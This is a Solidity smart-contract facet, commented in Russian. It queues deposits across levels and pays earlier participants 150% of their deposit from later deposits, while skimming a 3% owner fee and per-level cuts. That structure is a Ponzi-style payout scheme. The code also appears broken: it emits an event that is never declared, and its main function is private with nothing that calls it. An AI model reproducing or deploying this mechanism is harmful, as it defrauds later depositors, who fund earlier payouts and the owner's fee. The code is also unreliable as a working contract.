// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
import "./TestLib.sol";
contract processUtilizeFacet {
    modifier nonReentrant() {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(!ds.reentrancyLock, "Reentrancy Guard - Function is locked)");
        ds.reentrancyLock = true;
        _;
        ds.reentrancyLock = false;
    }

    event UtilizeReceived(
        address indexed sender,
        uint256 value,
        uint256 indexed index,
        uint256 queueIndex
    );
    function processUtilize(uint256 value, uint256 index) private nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.range[index].lastIndex++;
        //сразу добавляем в конец очереди нового участника)
        ds.ray[index][ds.range[index].lastIndex] = TestLib.Ray({
            addr: msg.sender,
            utilize: value
        });
        emit UtilizeReceived(
            msg.sender,
            value,
            index,
            ds.range[index].lastIndex
        );

        uint256 lowerLevelFee = value / 100; // по 1% на 5 уровней ниже)
        uint256 ownerFee = lowerLevelFee * 3; // 3% переводится владельцу)
        (bool ownerSuccess, ) = payable(ds.owner).call{value: ownerFee}("");
        require(ownerSuccess, "Transfer failed (ds.owner)");

        uint256 levelFee = 0;
        uint256 currentGas;

        bool checkInd = true;

        //храним цену газа за 1 цикл)
        //значение цены газа передаётся через того - кто утилизировал средства)
        uint256 gasCheck = tx.gasprice * 178000;

        ds.counterIt = 1;

        //сколько осталось доплатить первому участнику в очереди)
        uint256 leftCur = ds.range[index].leftFunds;
        //если остаток был весь погашен предыдущему участнику - то для нового выставляем опять 150% его значению утилизации)
        if (leftCur == 0) {
            leftCur =
                (ds.ray[index][ds.range[index].firstIndex].utilize * 3) /
                2;
        }

        //на 5 нижних уровней к текущим средствам прибавляется значение 1% - с условием - чтобы не спуститься ниже нулевого уровня)
        for (uint256 i = 1; i <= 5 && index != 0 && index >= i; i++) {
            levelFee += lowerLevelFee;
            ds.range[index - i].currentFunds += lowerLevelFee;
        }

        //текущая сумма всех вложений - минус 3% комиссия владельцу и 1% на газ)
        ds.sumFunds += value - lowerLevelFee - ownerFee;

        //текущий остаток на балансе для оплаты газа)
        currentGas = getBalance() - ds.sumFunds;
        //текущие средства плюс оставшаяся сумма)
        value =
            ds.range[index].currentFunds +
            value -
            ownerFee -
            levelFee -
            lowerLevelFee;

        //если оставшийся газ меньше цены газа за 1 цикл - тогда сохраняем нужные значения и больше ничего не делаем)
        if (currentGas < gasCheck) {
            checkInd = false;

            ds.range[index].currentFunds = value;
            ds.range[index].leftFunds = leftCur;
        }

        //выплата по текущему уровню и ниже на 5 уровней)
        while (currentGas >= gasCheck && checkInd && ds.counterIt <= 30) {
            //процесс выплаты)
            processPayOut(
                index,
                gasCheck,
                value,
                ds.sumFunds,
                ds.counterIt,
                currentGas,
                leftCur
            );

            //пока индекс не достиг нуля спускаемся на уровень ниже)
            if (index != 0) {
                index--;
                checkInd = true;
                currentGas = getBalance() - ds.sumFunds;
                value = ds.range[index].currentFunds;
                leftCur = ds.range[index].leftFunds;
            } else {
                checkInd = false;
            }
        }
    }
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    function processPayOut(
        uint256 index,
        uint256 gasChecks,
        uint256 valuee,
        uint256 sumF,
        uint256 counterIti,
        uint256 currentGas,
        uint256 leftCurr
    ) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        //делаем выплату всем участникам по очереди - по текущему индексу - с учётом текущих средств)
        //двойная проверка по газу - чтобы газа хватило и на последние действия после цикла)
        while (
            currentGas >= gasChecks &&
            currentGas >= gasChecks * 2 &&
            counterIti <= 30 &&
            valuee >= leftCurr &&
            ds.range[index].firstIndex <= ds.range[index].lastIndex
        ) {
            valuee -= leftCurr;
            //проверка - чтобы не выйти за границы диапазона и тем самым не выдало ошибку)
            if (sumF >= leftCurr) {
                sumF -= leftCurr;
            } else {
                sumF = 0;
            }

            //если индекс равен 0-1-2 и газ больше или равно 2 эфира - избыток газа идёт в бонус)
            //большой бонус первым трём уровням +1 эфир - и не важно сколько было утилизировано)
            if (index <= 2 && currentGas >= 2 ether) {
                leftCurr += 1 ether;
            }

            (bool payoutSuccess, ) = payable(
                ds.ray[index][ds.range[index].firstIndex].addr
            ).call{value: leftCurr}("");
            require(payoutSuccess, "Transfer failed (payout)");

            emit UtilizePayOut(
                ds.ray[index][ds.range[index].firstIndex].addr,
                leftCurr,
                index,
                ds.range[index].firstIndex
            );
            //если выплата произведена полностью - то удаляем первого участника из очереди)
            delete ds.ray[index][ds.range[index].firstIndex];
            ds.range[index].firstIndex++;
            counterIti++;
            currentGas = getBalance() - sumF;
            //сразу же задаём оставшееся значение следующему участнику равное 150% его утилизационным средствам)
            //и проверка - что в очереди кто-то ещё есть)
            if (ds.range[index].firstIndex <= ds.range[index].lastIndex) {
                leftCurr =
                    (ds.ray[index][ds.range[index].firstIndex].utilize * 3) /
                    2;
            } else {
                leftCurr = 0;
            }
        }

        //если общая сумма выплаты участнику ещё не достигла 150% - всё равно выплачиваем часть - что осталось в текущих средствах)
        if (
            currentGas >= gasChecks &&
            currentGas >= gasChecks * 2 &&
            counterIti <= 30 &&
            ds.range[index].firstIndex <= ds.range[index].lastIndex
        ) {
            //проверка - чтобы не выйти за границы диапазона и тем самым не выдало ошибку)
            if (leftCurr >= valuee) {
                leftCurr -= valuee;
            } else {
                leftCurr = 0;
            }
            //проверка - чтобы не выйти за границы диапазона и тем самым не выдало ошибку)
            if (sumF >= valuee) {
                sumF -= valuee;
            } else {
                sumF = 0;
            }
            //бонус +1 эфир - если остаток газа выше 2 эфиров)
            if (index <= 2 && currentGas >= 2 ether) {
                valuee += 1 ether;
            }

            (bool leftPayoutSuccess, ) = payable(
                ds.ray[index][ds.range[index].firstIndex].addr
            ).call{value: valuee}("");
            require(leftPayoutSuccess, "Transfer failed (left payout)");

            emit UtilizePayOut(
                ds.ray[index][ds.range[index].firstIndex].addr,
                valuee,
                index,
                ds.range[index].firstIndex
            );

            counterIti++;
            valuee = 0;
        }

        //сохраняем нужные нам значения по текущим и оставшимся средствам)
        ds.range[index].currentFunds = valuee;
        ds.range[index].leftFunds = leftCurr;

        ds.sumFunds = sumF;
        ds.counterIt = counterIti;
    }
}
